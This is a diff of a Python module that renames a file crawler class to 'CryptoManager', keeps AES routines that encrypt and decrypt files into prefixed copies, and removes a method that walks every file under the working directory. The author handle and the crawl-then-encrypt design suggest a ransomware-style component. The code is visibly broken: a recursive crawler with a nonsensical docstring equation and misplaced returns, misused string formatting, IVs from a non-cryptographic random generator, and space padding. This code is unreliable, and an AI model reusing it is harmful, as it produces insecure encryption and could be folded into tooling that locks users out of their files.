@@ -1,24 +1,27 @@
 #!/usr/bin/env python
-import os, platform, random, time
-from src.main.xsys.crawler.config.CrawlerConfig import CrawlerConfig
-# from Crypto.Hash import SHA256
+__author__ = "T0x1cEnv31ope"
+import os
+import platform
+import random
+from main.xsys.crawlers import Crawler
+#from Crypto.Hash import SHA256
 from Crypto.Cipher import AES
 
 
-class Crawler(CrawlerConfig):
+class CryptoManager(Crawler):
     """
         [Description]
         __init__
         - Construct a Crawler Object
     """
     def __init__(self):
-        super(Crawler, self).__init__()
+        super(CryptoManager, self).__init__()
 
     """
         [Description]
         clear_console
         - Clear the screen according to the running OS 
-
+         
         :returns -> lambda execution of os.command::clear_screen
     """
     @staticmethod
@@ -42,7 +45,7 @@ class Crawler(CrawlerConfig):
         :param -> filename:file - a given file to be encrypt
     """
     def encrypt(self, key, filename):
-        out_file = os.path.join(os.path.dirname(filename), self.SUFFIX + os.path.basename(filename))
+        out_file = os.path.join(os.path.dirname(filename), self.SUFFIX+os.path.basename(filename))
         file_size = str.format(os.path.getsize(filename)).zfill(self.SIXTEEN_BYTES)
         iv = ''
         for i in range(self.SIXTEEN_BYTES):
@@ -57,7 +60,7 @@ class Crawler(CrawlerConfig):
                     if len(chunk) == 0:
                         break
                     elif len(chunk) % self.SIXTEEN_BYTES != 0:
-                        chunk += ' ' * (self.SIXTEEN_BYTES - (len(chunk) % self.SIXTEEN_BYTES))
+                        chunk += ' '*(self.SIXTEEN_BYTES - (len(chunk) % self.SIXTEEN_BYTES))
                     elif len(chunk) != file_size:
                         outfile.write(encrypter.encrypt(chunk))
                     else:
@@ -85,50 +88,6 @@ class Crawler(CrawlerConfig):
                 outfile.write(decrypter.decrypt(chunk))
             outfile.truncate(int(file_size))
 
-    """
-        [Description]
-        recursive_file_crawler
-        - Create a Hierarchical Tree to index all files in the system
-           implementing: tree height = (nodes^2+1) -1 < leafs :- simplifying -1:LEFT, null:RIGHT equation
-        :return -> a Tree of OS files  
-    """
-    def recursive_file_crawler(self, tree=[], items=[], queue=[]):
-        if not items and not queue:
-            return self.recursive_file_crawler(None, [], [])
-        copy = queue[:]
-        queue = []
-        for item in copy:
-            if item is None:
-                items.append(None)
-                queue.append(None)
-                queue.append(None)
-            else:
-                items.append(item.key)
-                queue.append(item.left)
-                queue.append(item.right)
-            if all((x is None for x in queue)):
-                return items
-            return self.recursive_file_crawler(items, queue)
-
-    """
-        [Description]
-        linear_file_crawler
-        - Create a list of files form current working directory
-            and return the list
-        :return -> list of files
-    """
-    @staticmethod
-    def linear_file_crawler():
-        print('[SCANNING]')
-        all_files = []
-        start_time = int(round(time.time() * 1000))
-        for root, dirs, files in os.walk(os.getcwd()):
-            for names in files:
-                all_files.append(os.path.join(root, names))
-        end_time = int(round(time.time() * 1000))
-        res = '[Scan took {1} sec]\nTotal Files: {0}\n'.format(len(all_files), (end_time - start_time) / 1000)
-        return all_files, res
-
 
 if __name__ == '__main__':
-    c = Crawler()
+    c = CryptoManager()
